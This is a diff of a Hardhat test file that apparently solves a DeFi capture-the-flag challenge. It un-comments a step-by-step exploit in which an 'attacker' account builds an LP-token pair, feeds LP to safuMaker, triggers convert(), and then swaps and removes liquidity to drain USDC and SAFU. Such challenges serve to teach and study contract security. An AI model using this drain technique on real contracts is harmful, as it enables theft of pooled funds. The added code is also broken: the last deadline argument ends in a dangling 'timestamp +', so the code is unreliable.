@@ -108,83 +108,82 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
-    // // Approve Safu Router to use ERC20 tokens for adding liquidity.
-    // // Add 10 of each tokens to the LP.
-    // await usdc
-    // 	.connect(attacker)
-    // 	.approve(safuRouter.address, ethers.constants.MaxUint256);
-    // await safu
-    // 	.connect(attacker)
-    // 	.approve(safuRouter.address, ethers.constants.MaxUint256);
-    // await safuRouter
-    // 	.connect(attacker)
-    // 	.addLiquidity(
-    // 		usdc.address,
-    // 		safu.address,
-    // 		precision.mul(10),
-    // 		precision.mul(10),
-    // 		0,
-    // 		0,
-    // 		await attacker.getAddress(),
-    // 		(await ethers.provider.getBlock("latest")).timestamp + 1
-    // 	);
-    // // approving LP tokens for use
-    // await safuPair
-    // 	.connect(attacker)
-    // 	.approve(safuRouter.address, ethers.constants.MaxUint256);
-    // // creating a new pair of LP-SAFU
-    // await safuRouter
-    // 	.connect(attacker)
-    // 	.addLiquidity(
-    // 		safuPair.address,
-    // 		safu.address,
-    // 		precision.mul(1),
-    // 		100,
-    // 		0,
-    // 		0,
-    // 		await attacker.getAddress(),
-    // 		(await ethers.provider.getBlock("latest")).timestamp * 2
-    // 	);
-    // let attackPairFactory = new ethers.ContractFactory(
-    // 	pairJson.abi,
-    // 	pairJson.bytecode,
-    // 	attacker
-    // );
-    // let attackerPair = attackPairFactory.attach(
-    // 	await safuFactory.getPair(safuPair.address, safu.address)
-    // );
-    // // sending some LP of new pair to safuMaker & converting reward funds to SAFU
-    // let attackerLP = await attackerPair
-    // 	.connect(attacker)
-    // 	.balanceOf(await attacker.getAddress());
-    // await attackerPair
-    // 	.connect(attacker)
-    // 	.transfer(safuMaker.address, attackerLP.div(10)); // transfer 10% of LP
-    // // run the `exploit`
-    // await safuMaker.connect(attacker).convert(safu.address, safuPair.address);
-    // // swapping into attack LP pool to get most of the safuPair LP tokens
-    // // remove liquidity is better than swap, done for laziness bc underflow
-    // await safuRouter
-    // 	.connect(attacker)
-    // 	.swapExactTokensForTokens(
-    // 		precision.mul(1),
-    // 		0,
-    // 		[safu.address, safuPair.address],
-    // 		await attacker.getAddress(),
-    // 		(await ethers.provider.getBlock("latest")).timestamp * 2
-    // 	);
-    // // removing liquidity for the safuPair LP - receive USDC & SAFU
-    // await safuRouter
-    // 	.connect(attacker)
-    // 	.removeLiquidity(
-    // 		usdc.address,
-    // 		safu.address,
-    // 		await safuPair.balanceOf(await attacker.getAddress()),
-    // 		0,
-    // 		0,
-    // 		await attacker.getAddress(),
-    // 		(await ethers.provider.getBlock("latest")).timestamp * 2
-    // 	);
+    // Approve Safu Router to use ERC20 tokens for adding liquidity.
+    // Add 10 of each tokens to the LP.
+    await usdc
+        .connect(attacker)
+        .approve(safuRouter.address, ethers.constants.MaxUint256);
+    await safu
+        .connect(attacker)
+        .approve(safuRouter.address, ethers.constants.MaxUint256);
+    await safuRouter
+        .connect(attacker)
+        .addLiquidity(
+            usdc.address,
+            safu.address,
+            precision.mul(10),
+            precision.mul(10),
+            0,
+            0,
+            await attacker.getAddress(),
+            (await ethers.provider.getBlock("latest")).timestamp + 1
+        );
+
+    await safuPair
+        .connect(attacker)
+        .approve(safuRouter.address, ethers.constants.MaxUint256);
+
+    await safuRouter
+        .connect(attacker)
+        .addLiquidity(
+            safuPair.address,
+            safu.address,
+            precision.mul(1),
+            100,
+            0,
+            0,
+            await attacker.getAddress(),
+            (await ethers.provider.getBlock("latest")).timestamp + 1
+        );
+    let attackPairFactory = new ethers.ContractFactory(
+        pairJson.abi,
+        pairJson.bytecode,
+        attacker
+    );
+    let attackerPair = attackPairFactory.attach(
+        await safuFactory.getPair(safuPair.address, safu.address)
+    );
+
+    let attackerLP = await attackerPair
+        .connect(attacker)
+        .balanceOf(await attacker.getAddress());
+    await attackerPair
+        .connect(attacker)
+        .transfer(safuMaker.address, attackerLP.div(10)); // transfer 10% of LP
+
+    await safuMaker.connect(attacker).convert(safu.address, safuPair.address);
+
+    await safuRouter
+        .connect(attacker)
+        .swapExactTokensForTokens(
+            precision.mul(1),
+            0,
+            [safu.address, safuPair.address],
+            await attacker.getAddress(),
+            (await ethers.provider.getBlock("latest")).timestamp + 1
+        );
+
+    await safuRouter
+        .connect(attacker)
+        .removeLiquidity(
+            usdc.address,
+            safu.address,
+            await safuPair.balanceOf(await attacker.getAddress()),
+            0,
+            0,
+            await attacker.getAddress(),
+            (await ethers.provider.getBlock("latest")).timestamp +
+        );
 });
 
 /// expected final state
